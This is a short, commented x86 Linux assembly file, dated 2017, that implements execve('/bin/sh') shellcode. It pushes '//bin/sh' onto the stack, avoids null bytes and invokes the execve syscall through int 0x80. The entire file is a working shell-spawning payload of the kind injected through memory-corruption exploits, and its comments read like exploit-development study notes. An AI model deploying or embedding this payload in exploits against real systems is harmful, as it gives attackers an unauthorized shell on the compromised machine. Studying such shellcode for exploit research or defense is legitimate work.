;By Arun Kumar Shreevastava
;3rd March 2017

;execve("/bin/sh",{"/bin/sh",NULL}, NULL)

bits 32

global _start

section .text

_start:
	;PUSH //bin/sh with null terminator
	xor eax,eax
	push eax

	mov edx, esp	;envp = NULL
	
	push 0x68732f6e ;hs/n
	push 0x69622f2f ;ib//

	mov ebx, esp	;string //bin/sh

	;push argv
	push eax	;pointer to 2nd argv = NULL
	
	;push address of filename
	push ebx	;pointer to 1st argv = address of //bin/sh = ebx
	mov ecx, esp
	
	;execve, syscall number from /usr/include/x86_64-linux-gnu/asm/unistd_32.h
	mov al,11	;if we do mov eax,11 then we will get 0x00 in shellcode
	int 0x80
	
	

	
